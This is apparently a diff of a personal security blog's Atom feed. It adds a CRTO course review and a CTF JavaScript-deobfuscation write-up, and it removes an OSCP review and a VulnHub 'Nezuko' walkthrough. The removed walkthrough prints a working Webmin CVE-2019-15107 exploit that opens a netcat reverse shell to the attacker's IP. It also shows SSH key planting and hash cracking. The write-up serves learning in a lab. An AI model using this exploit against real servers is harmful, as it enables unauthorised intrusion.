@@ -1,4 +1,95 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/musubi/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/musubi/" rel="alternate" type="text/html" /><updated>2022-05-12T19:22:44+08:00</updated><id>http://localhost:4000/musubi/feed.xml</id><title type="html">Musubi</title><subtitle>Hey visitor, welcome to my site! (๑&gt;ᴗ&lt;๑)</subtitle><entry><title type="html"></title><link href="http://localhost:4000/musubi/others/osepreview" rel="alternate" type="text/html" title="" /><published>2022-05-11T00:00:00+08:00</published><updated>2022-05-11T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/OSEP_review</id><content type="html" xml:base="http://localhost:4000/musubi/others/osepreview"><![CDATA[<p>Hey guys, I’m back!</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/musubi/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/musubi/" rel="alternate" type="text/html" /><updated>2022-10-03T06:51:04+08:00</updated><id>http://localhost:4000/musubi/feed.xml</id><title type="html">Musubi</title><subtitle>Hey visitor, welcome to my site! (๑&gt;ᴗ&lt;๑)</subtitle><entry><title type="html"></title><link href="http://localhost:4000/musubi/others/crtoreview" rel="alternate" type="text/html" title="" /><published>2022-10-03T00:00:00+08:00</published><updated>2022-10-03T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/CRTO_review</id><content type="html" xml:base="http://localhost:4000/musubi/others/crtoreview"><![CDATA[<p>I have received an email confirmation that I have passed the Certified Red Team Operator exam so I would like to share my review about the <a href="https://training.zeropointsecurity.co.uk/courses/red-team-ops">course</a>.</p>
+
+<p><img src="/musubi/assets/crto/crto.PNG" alt="crto" /></p>
+
+<h1 id="intro">Intro</h1>
+
+<p>For those who didn’t know, I have passed my <a href="https://yunaranyancat.github.io/musubi/others/osepreview">OSEP</a> exam few months ago, and it is one of the reasons why I decided to enroll in CRTO. I won’t be comparing CRTO and PEN-300 so this review will be focusing on my journey when enrolling in the CRTO course.</p>
+
+<h1 id="course">Course</h1>
+
+<p>The course is pretty straightforward, from external recon until domain compromise. I would say that the course is C2 oriented since most of the time you will be interacting with the compromised machines from Cobalt Strike C2.</p>
+
+<p>You also will be able to experiment with Cobalt Strike different features such as artifact kit, resource kit, threat profile, scripts and many more!</p>
+
+<p>And in the point of view of a blue teamer, you will be able to understand how you can detect malicious activities, rogue processes running on your network.</p>
+
+<p>The best thing about the course is that once you have enrolled, you will get a lifetime access and update of the course, and this could help you build your own methodology for your future red team engagements.</p>
+
+<p>I have a habit of making a cheat sheet for every course I take, but strangely, the content in this course is concise and precise, I can just use it as my cheat sheet!</p>
+
+<p><img src="/musubi/assets/crto/pepehacker.gif" alt="pepehacker" /></p>
+
+<h1 id="who-is-this-course-for">Who is this course for?</h1>
+
+<p>I think this is the best course to start your experience as a red teamer! So, if you want to get the feeling of compromising an organization’s domain, this is your chance.</p>
+
+<h1 id="bonus--how-do-i-pass-the-exam">BONUS : How do I pass the exam?</h1>
+
+<p>The course is short, concise and precise, you just need to fully understand the course content and everything in the exam will feel like a revision! And guess what, it’s an open book exam!</p>
+
+<p><img src="/musubi/assets/crto/openbook.jpg" alt="ob" /></p>
+
+<h1 id="whats-next">What’s next?</h1>
+
+<p>CRTOv2 boi, I’ll need to read the reviews and the curriculum offered first.</p>
+
+<p>See ya!</p>
+
+<h1 id="credits">Credits</h1>
+
+<p><img src="/musubi/assets/crto/salute.gif" alt="salute" /></p>
+
+<p>Thanks to RastaMouse for the awesome course content, thanks to amdsyad and saitamang for giving me the motivation to take the course, and to azrultech for sharing his CRTO experience.</p>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[I have received an email confirmation that I have passed the Certified Red Team Operator exam so I would like to share my review about the course.]]></summary></entry><entry><title type="html"></title><link href="http://localhost:4000/musubi/others/ctfjembalang" rel="alternate" type="text/html" title="" /><published>2022-07-18T00:00:00+08:00</published><updated>2022-07-18T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/ctf-jembalang</id><content type="html" xml:base="http://localhost:4000/musubi/others/ctfjembalang"><![CDATA[<p>This is a writeup regarding a CTF challenge for the Battle of 1337 CTF hosted by Tenang Komuniti Sdn. Bhd and Yayasan Digital Malaysia.</p>
+
+<p><img src="/musubi/assets/jembalang/ctf.PNG" alt="CTF1337" /></p>
+
+<p>You can download the source code <a href="https://github.com/yunaranyancat/ctf-dump/blob/main/jembalang.zip">here</a>.</p>
+
+<p>First, you will be greeted by this locked page.</p>
+
+<p><img src="/musubi/assets/jembalang/unlockpage.PNG" alt="lockedpage" /></p>
+
+<p>By inspecting the element, it shows a text and an ASCII art of the infamous Mr Trollface.</p>
+
+<p><img src="/musubi/assets/jembalang/troll.PNG" alt="trollface" /></p>
+
+<p>The password to unlock the page is obvious : <strong>DOWN HERE</strong></p>
+
+<p>When the page is unlocked, this page will be shown.</p>
+
+<p><img src="/musubi/assets/jembalang/intro.PNG" alt="intro" /></p>
+
+<p>Disable the jumpscare by unticking the events on the secret field so you will be able to submit the secret.</p>
+
+<p><img src="/musubi/assets/jembalang/nojumpscare.PNG" alt="disablejumpscare" /></p>
+
+<p>For those who are curious, this is the jumpscare;</p>
+
+<p><img src="/musubi/assets/jembalang/jumpscare.PNG" alt="jumpscare" /></p>
+
+<p>By going to the debugger, there’s an interesting js file, filled with Mr Trollface ASCII art, again.</p>
+
+<p><img src="/musubi/assets/jembalang/debugger.PNG" alt="dbugger" /></p>
+
+<p>On line 88, you will find a long string of obfuscated javascript code.</p>
+
+<p><img src="/musubi/assets/jembalang/line88.PNG" alt="line88" /></p>
+
+<p>Decode it using <a href="https://lelinhtinh.github.io/de4js/">de4js</a> with paramater set to eval.
+Here you will see that to unlock the page, you will need to concatenate all of the character taken from the string c.</p>
+
+<p><img src="/musubi/assets/jembalang/de4js.PNG" alt="de4jseval" /></p>
+
+<p>I’ll let you sort it by yourself. ;)</p>
+
+<p><img src="/musubi/assets/jembalang/free.PNG" alt="free" /></p>
+
+<p>And the end.</p>
+
+<p><img src="/musubi/assets/jembalang/end.PNG" alt="end" /></p>
+
+<p>it’s not that troll-ish , isn’t it? (&gt;‿◠)✌</p>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[This is a writeup regarding a CTF challenge for the Battle of 1337 CTF hosted by Tenang Komuniti Sdn. Bhd and Yayasan Digital Malaysia.]]></summary></entry><entry><title type="html"></title><link href="http://localhost:4000/musubi/others/osepreview" rel="alternate" type="text/html" title="" /><published>2022-05-11T00:00:00+08:00</published><updated>2022-05-11T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/OSEP_review</id><content type="html" xml:base="http://localhost:4000/musubi/others/osepreview"><![CDATA[<p>Hey guys, I’m back!</p>
 
 <p><img src="/musubi/assets/osep/kongming.gif" alt="kongming" /></p>
 
@@ -44,7 +135,7 @@
     <p>While watching and reading, take note of the code snippets, specific keywords, new terms, so you can perform a deeper research outside of the course.</p>
   </li>
   <li>
-    <p>Whenever you’re stuck, pause the video, stop scrolling the PDF and read the documentation that’s available online. 
+    <p>Whenever you’re stuck, pause the video, stop scrolling the PDF and read the documentation that’s available online.
 For example, if you don’t know what is <strong>MessageBox</strong>, you can read the official documentation <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox">here</a> or for .NET,	<a href="https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.messagebox?view=windowsdesktop-6.0">here</a> , you also will be interested to read <a href="https://docs.microsoft.com/en-us/dotnet/api/system.windows.messagebox?view=windowsdesktop-6.0">this</a>. Try to understand what are the differences between each <strong>“MessageBox”</strong>.</p>
   </li>
   <li>
@@ -957,335 +1048,4 @@ button, we are redirected to another page which shows a potential credential.</p
 
 <p>Thanks and Happy New Year!</p>
 
-<p><img src="/musubi/assets/binary0x01/newyear.gif" alt="ny" /></p>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[It is time to play with the most simplest form of binary exploitation, vanilla EIP overwrite buffer overflow with no stack protection.]]></summary></entry><entry><title type="html">From script kiddie to advanced script kiddie : OSCP bedtime story</title><link href="http://localhost:4000/musubi/others/oscpreview" rel="alternate" type="text/html" title="From script kiddie to advanced script kiddie : OSCP bedtime story" /><published>2019-09-15T00:00:00+08:00</published><updated>2019-09-15T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/OSCP_Review</id><content type="html" xml:base="http://localhost:4000/musubi/others/oscpreview"><![CDATA[<p>Hi guys, what’s up. Few days ago I just received a mail from Offsec saying that I have passed the Offensive Security Certified Professional(OSCP) exam.</p>
-
-<p>Since I have some time to kill, I will share the journey and preparations that I took before I decided to take OSCP exam and also I will share my labs and exam experiences. This post will be quite different compared to my OSWP <a href="https://yunaranyancat.github.io/musubi/others/oswpreview">review</a> as I won’t put much details on the course (there are lots of OSCP reviews that explain what is OSCP, what are the course pre requisites, who should take it, etc..) but rather I will explain on how I prepared myself before taking OSCP. Ok, enough for introduction, let’s delve deep into a script kiddie’s journey to become an OSCP holder.</p>
-
-<p>I will divide different sections where I will call it as levels. These levels will indicate where I was, what were my skill sets at that time and what did I do to go to the next level..</p>
-
-<p>Bear with me, it’s not a short journey..</p>
-
-<p><img src="/musubi/assets/oscp/hacker.jpeg" alt="hacker_a_day" /></p>
-
-<h3 id="level-1-i-know-linux-but-i-dont-know-anything--know-a-little-bit-about-penetration-testing-time-spent--12-months">Level 1 (I know Linux but I don’t know anything / know a little bit about penetration testing) [Time spent : 1~2 months]</h3>
-
-<p>Hello there, I know we are all have been in this place. This is the moment right after we have decided to dive deep into the world of penetration testing, or I would say, ethical hacking.</p>
-
-<p>This is the moment where we got frustrated whenever we fail to understand anything.. the moment where, whenever we wanted to install some distros or some hacking tools but failed, we just paste the error in the forum or a facebook group and ask the pros, “hi there, can anyone help me?”, in hope of someone will help and maybe tell us something like, “why don’t you read the error from the terminal and then try to search what the error says online?” ; but instead we got told “try harder”, “google is your friend” or even a sad facebook emoji reaction with no replies. It’s okay. It’s totally fine. It’s not that they don’t want to help you.</p>
-
-<p>Maybe it is another way of teaching you and making you think and realize that, “Let’s imagine that you are currently taking OSCP exam and you don’t know what to do.. do you ask directly for someone else help? No, you won’t, and you can’t.”</p>
-
-<p>You need to find your way in and out, you need to find an entry point, you need to google every term that you know and that is when you will understand what do they mean by <strong>google is your friend</strong>.</p>
-
-<p><img src="/musubi/assets/oscp/desperation.jpeg" alt="desperation" /></p>
-
-<p>When I was at this level, I bought a book titled <strong>Penetration Testing: A Hands-On Introduction to Hacking</strong> by Georgia Weidman.</p>
-
-<p>After that, I started playing <a href="https://www.hackthebox.eu/">HackTheBox</a>, which my first machine was <a href="https://www.youtube.com/watch?v=PJeBIey8gc4">Jerry</a> (Jerry has just got retired when I wanted to try it, I think around early December). At that time, I was pretty happy to get a shell eventhough I was just replicating everything what <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">Ippsec</a> did.</p>
-
-<h3 id="level-2-i-know-what-is-pentest-but-i-still-need-to-make-myself-comfortable-with-hacking-or-boot-to-root-ctf-style-time-spent--as-long-as-it-should-take">Level 2 (I know what is pentest but I still need to make myself comfortable with hacking or boot-to-root CTF style) [Time spent : As long as it should take]</h3>
-
-<p>This is where I spent most of my time playing HTB, met a lot of new friends, shared and exchanged lots of knowledge, joined lots of groups.. and after a month playing HTB, I managed to obtain a <strong>Guru</strong> rank from <strong>script kiddie</strong> rank (I was really close to <strong>Omniscient</strong> as I managed to root all of the active machines at that time but I was stuck at binary exploitation challenges, because, you know… which script kiddie can do binary exploitation? <strong>(&gt;_&lt;)</strong> ) ..</p>
-
-<p>Other than that, sometimes I spent my time playing with other CTF sites such as root-me, rankkk, and etc.. but, HTB is number one in my heart. ☆⌒(ゝ。∂)</p>
-
-<p>Check out my <a href="https://www.wechall.net/profile/y4t0">wechall</a> profile for more info.</p>
-
-<h3 id="level-3-i-think-i-know-how-to-root-a-machine-but-now-i-need-to-focus-more-on-oscp-style-machines-time-spent--1-month">Level 3 (I think I know how to root a machine but now I need to focus more on OSCP style machines) [Time spent : 1 month]</h3>
-
-<p>I know I know, it’s the infamous OSCP like HTB machines list created by <a href="https://twitter.com/TJ_Null">TJnull</a>.. Hehehe.. So, at this point, I started to do one by one based on that list.</p>
-
-<p><img src="/musubi/assets/oscp/oscplike.jpg" alt="oscplike" /></p>
-
-<p>Okay, these are my tips and tricks on how to gain the most of knowledge for every box that is on the list. (Not just for OSCP)</p>
-
-<p>First, I will enumerate the machine by myself. What do I mean by that is I will try to find running services and then, I will enumerate the service that I know at that time. When I’m stuck or when I run out of ideas, only then would I watch Ippsec videos but I will <strong>ONLY</strong> watch the PART where I was stuck.</p>
-
-<p>After that,  I paused the video then proceed my enumeration and then repeat the methods until I have managed to root the machine. This will give me new enumeration and exploitation ideas or techniques which I can try to use them on other boxes later on.</p>
-
-<p>After I have rooted a machine, I re-watched Ippsec videos about that machine , again, without pausing. This is the moment where I wanted to know how he did it and what’s different than what I did and how can I improve my enumeration techniques. The special thing about his videos is he didn’t root it only one way, but he also will try to find another way of enumerating the machine. (This also can be done by reading different writeups available online).</p>
-
-<p>And the last cycle is optional, re-root the machine without any help. (Practice what you just learned + what you already know)</p>
-
-<p>I can say that I’m pretty good with Linux machines, so I spent more time on Windows boxes. I learned about Windows environment, such as file transfers, system information, services and others that might give me the idea on how to find vulnerabilities in Windows machine.</p>
-
-<h3 id="level-4-im-pretty-confident-to-take-oscp-exam-time-spent--1-month">Level 4 (I’m pretty confident to take OSCP exam) [Time spent : 1 month]</h3>
-
-<p>I then booked the labs for 30 days, then scheduled the exam a week before my lab time finished (I’m scared that if I waited too long, I may end up procrastinating). Since I was pretty comfortable with my enumeration (to a comfortable level), I didn’t play much in the labs. I only used the labs to practice my buffer overflow techniques.</p>
-
-<p>At first, I have decided to focus only on the buffer overflow part on the last week before the exam started, however, when I realized that the buffer overflow part was pretty easy to replicate, it boosted my confidence and that is when I decided to rescheduled my exam to be another week earlier than scheduled.</p>
-
-<h3 id="level--oscp-exam-time-spent--24-hours">Level ??? (OSCP exam) [Time spent : 24 hours++]</h3>
-
-<p>Targets :
-Few machines with one of them is the buffer overflow thingy..</p>
-
-<p>The exam started at 11PM (Normally I’m already sound asleep at this time). I have prepared three cans of Redbull beside me just in case my eyes won’t open when I wanted it to.. :3</p>
-
-<p>So, my strategy was like this :</p>
-
-<ul>
-  <li>Tackle buffer overflow machine first as it is the easiest one, for me. :&gt;</li>
-  <li>While doing Bof, run <a href="https://github.com/21y4d/nmapAutomator">nmapautomator</a> for the other machines and come back later to run a more thorough manual scans. (nikto, gobuster, nmap scripts scan etc..)</li>
-</ul>
-
-<p>It took me around two hours to complete the buffer overflow part. I did it slow and steady so that I will know where are the errors just in case the exploit didn’t work. Once I have finished the buffer overflow part, I focused on my scan results for other machines.</p>
-
-<p>My standard enumeration + exploitation techniques would be ;</p>
-
-<ol>
-  <li>Identify open ports and what are the running services.</li>
-  <li>Find the version of the running services and compare it to the latest version available online. If the version is quite old, then there’s a possibility that it is an entry point into the target.</li>
-  <li>Read the exploits that are related to the running services and understand how it can be exploited.</li>
-  <li>Repeat step 2-3 until you have identified some ports that could be your entry point (some low priv shell or even a root shell ) with different list of possible vulnerabilities.</li>
-  <li>Rabbit holes : IMHO, rabbit holes only exist if you ;
-    <ul>
-      <li>Do not understand how the exploits work (If you know how they work but when you run them against that particular service then nothing happened, then move on to different services/ports, that service might not be vulnerable even though it’s version is vulnerable.. we can assume that it has been patched)</li>
-      <li>Keep running the exploit again and again without modifying the exploit code hoping that it will work (Insanity is about doing the same thing over and over again and expecting different results.. The key is to understand what and why it’s not working.)</li>
-      <li>Panic and suddenly forgetting every simple enumeration technique that you have learned. (Keep calm and go through your enumeration slowly, one by one. No one will ever know what’s waiting ahead, so keep enumerating..)</li>
-    </ul>
-  </li>
-  <li>If all of the above didn’t work, then check back :
-    <ul>
-      <li>Your scan results (Have you scanned all ports? TCP or UDP? )</li>
-      <li>Did you forget something / enumerating each port that is open? If you are paranoid like me , you can use this <a href="http://www.0daysecurity.com/penetration-testing/enumeration.html">list</a></li>
-      <li>Did you forget to modify the exploits to fit your target environment? (ports? protocols? path? version? command? or even running Operating System?)</li>
-      <li>Did you forget to take A REST? A quick nap or even few minutes of break could help you get back in the game.</li>
-    </ul>
-  </li>
-  <li>Profit</li>
-</ol>
-
-<p>Extra note :</p>
-
-<p><strong>Metasploit usage</strong></p>
-
-<p>Some of you might find that using Metasploit would be rewarding, however that wasn’t my case.</p>
-
-<p>12 hours passed and I have rooted all of the machines except for one machine, which was one of the highest points machine and I only got a normal user shell (low privilege). Since I was very frustrated that my exploits didn’t work + I’m so tired and sleepy (I have only slept for 3 hours in total during my exam day ; <strong>1 hour</strong> during the midnight, <strong>1 hour</strong> during the early morning and another <strong>1 hour</strong> in the evening), I went into <del>rage</del> script kiddie mode.</p>
-
-<p><img src="/musubi/assets/oscp/noob.jpeg" alt="noob" /></p>
-
-<p>I then upgraded my shell into a Meterpreter session hoping that <strong>local exploit suggester</strong> in Metasploit would work. However, I found nothing. Nothing at all. Not even a tiny bit of clue popped up after I have used my supposedly Metasploit “allowance” . Then I realized that I forgot to do something, one of the most important things to do for everyone especially for those who are taking the exam; <strong>I FORGOT TO TAKE A REST</strong>.</p>
-
-<p><img src="/musubi/assets/oscp/meterpreter.jpeg" alt="meterpreter" /></p>
-
-<p>Then, I went out for lunch with my friends and then I started to calm down. After that, I enumerated the machine slowly and carefully using my low priv shell, and then, I found an entry point. It was just right in front of my eyes. I didn’t know how could I have missed it. Then, after few modifications to the exploit code, I managed to get a root shell! Wohooo.. 100 points my boi..</p>
-
-<p><img src="/musubi/assets/oscp/chikadance.gif" alt="chika" /></p>
-
-<h3 id="report">Report</h3>
-
-<p>Hah! You thought that the suffering has ended don’t ya? Yeah, it actually has ended. Now, for most of us, it’s a calmer moment. I used this report <a href="https://github.com/whoisflynn/OSCP-Exam-Report-Template">template</a> then submitted my report on the next day early morning.</p>
-
-<h3 id="fin">Fin</h3>
-
-<p>Few days later, I got a mail telling that I have passed the OSCP exam. Another good news, I slept very well that night.</p>
-
-<p><img src="/musubi/assets/oscp/sleep.gif" alt="chika" /></p>
-
-<h2 id="tldri-hate-weebs">TL;DR;I hate weebs;</h2>
-
-<p><strong>Pre-OSCP</strong></p>
-
-<p>a. Penetration Testing: A Hands-On Introduction to Hacking (Georgia Weidman)</p>
-
-<p><img src="/musubi/assets/oscp/gw.jpg" alt="gw" /></p>
-
-<p>b. TJnull HackTheBox OSCP like machines list</p>
-
-<p><img src="/musubi/assets/oscp/oscplike.jpg" alt="oscplike2" /></p>
-
-<p><strong>OSCP</strong></p>
-
-<ul>
-  <li><a href="https://github.com/21y4d/nmapAutomator">nmapautomator</a></li>
-  <li>0 day security <a href="http://www.0daysecurity.com/penetration-testing/enumeration.html">checklist</a></li>
-  <li><a href="https://github.com/SecWiki/windows-kernel-exploits">secwiki</a> Windows kernel exploits</li>
-  <li>g0tmi1k linux privilege <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">escalation</a></li>
-  <li>sushant747 windows privilege <a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">escalation</a></li>
-</ul>]]></content><author><name>yunaranyancat</name></author><category term="jekyll" /><summary type="html"><![CDATA[Hi guys, what’s up. Few days ago I just received a mail from Offsec saying that I have passed the Offensive Security Certified Professional(OSCP) exam.]]></summary></entry><entry><title type="html">VM Nezuko Boot2Root Writeup</title><link href="http://localhost:4000/musubi/others/vm_nezuko" rel="alternate" type="text/html" title="VM Nezuko Boot2Root Writeup" /><published>2019-08-21T00:00:00+08:00</published><updated>2019-08-21T00:00:00+08:00</updated><id>http://localhost:4000/musubi/others/vm_nezuko_writeup</id><content type="html" xml:base="http://localhost:4000/musubi/others/vm_nezuko"><![CDATA[<p>Hi there. This is my boot2root writeup for a vm called “Nezuko”. For those who didn’t manage to play with it, download the <a href="https://www.vulnhub.com/entry/nezuko-1,352/">vm</a> and come back when you have finished.</p>
-
-<h3 id="about-nezuko-vm">About Nezuko VM</h3>
-
-<p><img src="/musubi/assets/vm_nezuko/nezukovm.png" alt="nezukovm" /></p>
-
-<p>I would consider this as an easy to intermediate level machine. But, if you need some hints, do reach me on <a href="htttps://twitter.com/yunaranyancat">Twitter</a></p>
-
-<h2 id="walkthrough">Walkthrough</h2>
-
-<h3 id="enumeration">Enumeration</h3>
-
-<p>Let’s assume that we put our attacking machine (Kali) and Nezuko VM inside the same subnet which is <code class="language-plaintext highlighter-rouge">10.10.10.0/24</code> .
-Therefore, by running <code class="language-plaintext highlighter-rouge">netdiscover -i eth0 -r 10.10.10.0/24</code> , we will find out that Nezuko vm is located at <code class="language-plaintext highlighter-rouge">10.10.10.4</code>.</p>
-
-<p>p/s : the Kali vm has an IP of <code class="language-plaintext highlighter-rouge">10.10.10.5</code> . This is useful for us to create a reverse shell later.</p>
-
-<p><img src="/musubi/assets/vm_nezuko/netdiscover.png" alt="netdiscover" /></p>
-
-<p>By running <code class="language-plaintext highlighter-rouge">nmap -sS -sC -sV -oA nezukocommon 10.10.10.4</code> , we will get the following output.</p>
-
-<p><img src="/musubi/assets/vm_nezuko/nmapcommon.png" alt="nmapcommon" /></p>
-
-<p>Now, let’s go to the webpage of <code class="language-plaintext highlighter-rouge">10.10.10.4</code> .</p>
-
-<p><img src="/musubi/assets/vm_nezuko/nezukowebpage.png" alt="nezukowebpage" /></p>
-
-<p>Nothing interesting except for nezuko chan.. ಥ ⌣ ಥ</p>
-
-<p>By going to <code class="language-plaintext highlighter-rouge">10.10.10.4/robots.txt</code> , we will find an encoded text there.</p>
-
-<p><img src="/musubi/assets/vm_nezuko/robotswebpage.png" alt="robotswebpage" /></p>
-
-<p>The text is encoded with base32. Using online decoder such as this <a href="https://emn178.github.io/online-tools/base32_decode.html">site</a> , we will get below plaintext.</p>
-
-<p><img src="/musubi/assets/vm_nezuko/base32_decoded.png" alt="base32_decoded" /></p>
-
-<p>Since we got a hint from nezuko saying this is not the right port to enumerate. We will run an nmap scan again now to scan all ports.</p>
-
-<p>Note : By default, nmap will only scan for common 1000 ports. You can check the specific ports that nmap scans using the default scan on this <a href="https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/">site</a>.</p>
-
-<p>By running <code class="language-plaintext highlighter-rouge">nmap -sS -sC -sV -p- -oA nezukoallports 10.10.10.4</code> , we will get below output.</p>
-
-<p><img src="/musubi/assets/vm_nezuko/nmapallports.png" alt="nmapallports" /></p>
-
-<p>It seems that port <code class="language-plaintext highlighter-rouge">13337</code> is running a <code class="language-plaintext highlighter-rouge">webmin</code> service. This might be an entry point for us.</p>
-
-<h3 id="exploitation">Exploitation</h3>
-
-<p>The target is running <code class="language-plaintext highlighter-rouge">webmin 1.920</code> . After some searching for webmin vulnerabilities, we will find a remote code execution vulnerability related to this specific version of webmin.</p>
-
-<ul>
-  <li><a href="https://www.exploit-db.com/exploits/47293">https://www.exploit-db.com/exploits/47293</a></li>
-</ul>
-
-<p><img src="/musubi/assets/vm_nezuko/testexploit.png" alt="testexploit" /></p>
-
-<p>Another link will lead us to a Metasploit module. However, we will not be using Metasploit because it will ruin all of the fun.</p>
-
-<ul>
-  <li><a href="https://www.exploit-db.com/exploits/47230">https://www.exploit-db.com/exploits/47230</a></li>
-</ul>
-
-<p><img src="/musubi/assets/vm_nezuko/metasploit.png" alt="metasploit" /></p>
-
-<p>Copy the shell script (in the first link) to our Kali to test if the target is vulnerable to rce exploit or not.</p>
-
-<p><img src="/musubi/assets/vm_nezuko/vulnerablecheck.png" alt="vulnerablecheck" /></p>
-
-<p>So it seems that the target is vulnerable.</p>
-
-<p>We will modify the test code so that we can get a shell from the machine.</p>
-
-<p>Our final exploit code should look something like this.</p>
-
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/sh</span>
-<span class="nv">URI</span><span class="o">=</span><span class="nv">$1</span><span class="p">;</span>
-
-<span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"Exploit for RCE (CVE-2019-15107) on </span><span class="nv">$URI</span><span class="s2">: "</span><span class="p">;</span>
-curl <span class="nt">-ks</span> <span class="nv">$URI</span><span class="s1">'/password_change.cgi'</span> <span class="nt">-d</span> <span class="s1">'user=wheel&amp;pam=&amp;expired=2&amp;old=id|nc -e /bin/bash 10.10.10.5 1337 &amp;new1=wheel&amp;new2=wheel'</span> <span class="nt">-H</span> <span class="s1">'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;'</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded"</span> <span class="nt">-H</span> <span class="s1">'Referer: '</span><span class="nv">$URI</span><span class="s1">'/session_login.cgi'</span> <span class="nt">-X</span> POST</code></pre></figure>
-
-<p>Before running the exploit we should start our netcat listener on our Kali.</p>
-
-<p><img src="/musubi/assets/vm_nezuko/listener_1337.png" alt="listener_1337" /></p>
-
-<p>Then run the exploit code,</p>
-
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~#sh exploit.sh https://10.10.10.4:13337</code></pre></figure>
-
-<p><img src="/musubi/assets/vm_nezuko/nezuko_shell.png" alt="nezuko_shell" /></p>
-
-<p>We got a shell as nezuko!</p>
-
-<h3 id="optional-upgrade-to-ssh-session">(Optional) Upgrade to SSH session</h3>
-
-<p>We can obtain ssh session as nezuko by adding our public key to <code class="language-plaintext highlighter-rouge">/home/nezuko/.ssh/authorized_keys</code>.</p>
-
-<p>First we need to generate our own private and public SSH key.</p>
-
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~#ssh-keygen <span class="nt">-t</span> rsa</code></pre></figure>
-
-<p>Save the key in our current working directory by putting a name when prompted for the filename, in this case, the filename will be <code class="language-plaintext highlighter-rouge">yunaranyancat</code></p>
-
-<p>Copy the content of <code class="language-plaintext highlighter-rouge">yunaranyancat.pub</code> to <code class="language-plaintext highlighter-rouge">/home/nezuko/.ssh/authorized_keys</code></p>
-
-<p><img src="/musubi/assets/vm_nezuko/ssh-keygen.png" alt="ssh-keygen" /></p>
-
-<p><img src="/musubi/assets/vm_nezuko/copytoauthkeys.png" alt="copytoauthkeys" /></p>
-
-<p>After that we can ssh as nezuko using following command</p>
-
-<p><img src="/musubi/assets/vm_nezuko/sshprivate.png" alt="sshprivate" /></p>
-
-<h3 id="changing-user-to-zenitsu">Changing user to zenitsu</h3>
-
-<p>We find out that <code class="language-plaintext highlighter-rouge">/etc/passwd</code> is readable and furthermore, it reveals <code class="language-plaintext highlighter-rouge">zenitsu</code> password hash.</p>
-
-<p><img src="/musubi/assets/vm_nezuko/etcpasswd.png" alt="etcpasswd" /></p>
-
-<p>We can try to crack the hash using hashcat by typing following command.</p>
-
-<p><img src="/musubi/assets/vm_nezuko/copytocrack.png" alt="copytocrack" /></p>
-
-<p><img src="/musubi/assets/vm_nezuko/examplehash.png" alt="examplehash" /></p>
-
-<p>And after waiting for a while, the hash has been cracked and stored inside file <code class="language-plaintext highlighter-rouge">cracked</code>.</p>
-
-<p><img src="/musubi/assets/vm_nezuko/cracked.png" alt="cracked" /></p>
-
-<p>Once we got the password, which is <code class="language-plaintext highlighter-rouge">meowmeow</code> , we can su as <code class="language-plaintext highlighter-rouge">zenitsu</code> user.</p>
-
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nezuko@ubuntu:~#su zenitsu</code></pre></figure>
-
-<p>and when prompted with password, put <code class="language-plaintext highlighter-rouge">meowmeow</code> and then click enter.</p>
-
-<h3 id="privilege-escalation">Privilege escalation</h3>
-
-<p>As <code class="language-plaintext highlighter-rouge">nezuko</code> user before, we found out that there is a folder named <code class="language-plaintext highlighter-rouge">from_zenitsu</code> in the home directory and now as <code class="language-plaintext highlighter-rouge">zenitsu</code>, we found a folder named <code class="language-plaintext highlighter-rouge">to_nezuko</code>. Upon inspecting both folder, we can say that these directories;</p>
-
-<ul>
-  <li>
-    <p>from_zenitsu : contains message sent by zenitsu every 5 minutes (based on the name of the messages)</p>
-  </li>
-  <li>
-    <p>to_nezuko : contains a bash script owned by zenitsu that will send a message to nezuko.</p>
-  </li>
-</ul>
-
-<p>However, upon further inspection, we found out that the script is being run by <code class="language-plaintext highlighter-rouge">root</code> instead. That’s why the messages sent to nezuko home directory are owned by <code class="language-plaintext highlighter-rouge">root</code>.</p>
-
-<p>We can verify it by running</p>
-
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nezuko@ubuntu:~#ls <span class="nt">-la</span> /home/nezuko/from_zenitsu/<span class="k">*</span></code></pre></figure>
-
-<p>This means that, we can escalate our current privileges to <code class="language-plaintext highlighter-rouge">root</code> privileges by modifying the content of bash.</p>
-
-<p>Since the owner of the script is <code class="language-plaintext highlighter-rouge">zenitsu</code> , then it is possible to overwrite the script.</p>
-
-<p><img src="/musubi/assets/vm_nezuko/cannot_change_bash.png" alt="cannot_change_bash" /></p>
-
-<p>But, it seems that we obtained <code class="language-plaintext highlighter-rouge">permission denied</code> when trying to overwrite the content of the bash script.</p>
-
-<h3 id="exploiting-file-attributes">Exploiting file attributes</h3>
-
-<p>When running <code class="language-plaintext highlighter-rouge">lsattr</code> on the bash script, it showed that the file attribute of the bash script has been changed to <code class="language-plaintext highlighter-rouge">a</code>(append) mode only. This means we can only append the script but cannot overwrite it.</p>
-
